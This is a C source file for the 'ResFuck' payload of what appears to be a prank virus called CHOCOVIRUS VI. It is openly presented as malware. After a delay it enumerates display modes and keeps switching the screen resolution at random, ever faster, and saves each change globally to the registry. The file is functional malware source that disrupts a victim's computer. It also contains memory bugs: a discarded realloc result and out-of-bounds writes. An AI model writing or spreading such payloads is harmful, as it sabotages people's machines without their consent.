//
// CHOCOVIRUS VI
// (C) 2019 modeco80 and CHOCOLATEMAN.
//
// File:
//		ResFuckPayload.c
//
// Description:
//		Resolution fuck payload
//

#include "Common.h"
#include "PayloadMan.h"
#include "RegUtil.h"
#include <stdlib.h>
#include <math.h>

// Custom display mode struct
typedef struct {
	DWORD height, width, bits, rotation, hz;
} ResFuckDisplayMode;

DEVMODE devmode;

// Array of all display modes that are valid
int AllModesCount;
ResFuckDisplayMode* AllModes;

float x = 1.0f;

BOOL Cond_ResFuck(void* This) {
	return TRUE;
}

void Init_ResFuck(void* This) {
	Sleep(10000);
	AllModesCount = 5;
	AllModes = calloc(5, sizeof(ResFuckDisplayMode));
	devmode.dmSize = sizeof(DEVMODE);
	for (int i = 0; EnumDisplaySettings(NULL, i, &devmode); ++i) {

		if (i > AllModesCount) {
			// Reallocate array if it's too small
			AllModesCount = i;
			realloc(AllModes, i * sizeof(ResFuckDisplayMode));
		}
		BLITZ_DEBUG_LOG("Adding mode %lu x %lu (%d)", devmode.dmPelsWidth, devmode.dmPelsHeight, i)
		ResFuckDisplayMode dm = {
			devmode.dmPelsHeight,
			devmode.dmPelsWidth,
			devmode.dmBitsPerPel,
			devmode.dmDisplayOrientation,
			devmode.dmDisplayFrequency
		};
		AllModes[i] = dm;
	}
}

void Work_ResFuck(void* This) {
	// Randomly switch between the supported modes we collected.
	int index = rand() % AllModesCount;
	ResFuckDisplayMode dm = AllModes[index];

	DEVMODE mode = devmode;
	mode.dmPelsHeight = dm.height;
	mode.dmPelsWidth = dm.width;
	mode.dmBitsPerPel = dm.bits;
	mode.dmDisplayFrequency = dm.hz;

	BLITZ_DEBUG_LOG("Changing current mode to %d (%lu x %lu)", index, dm.width, dm.height)
	ChangeDisplaySettings(&mode, CDS_UPDATEREGISTRY|CDS_GLOBAL);
	// stolen from CHOCOVIRUS V
	Sleep(pow(0.95, x++) * 10000);
}

BlitzPayload ResFuck = {
	"ResFuck",
	Cond_ResFuck,
	Init_ResFuck,
	Work_ResFuck
};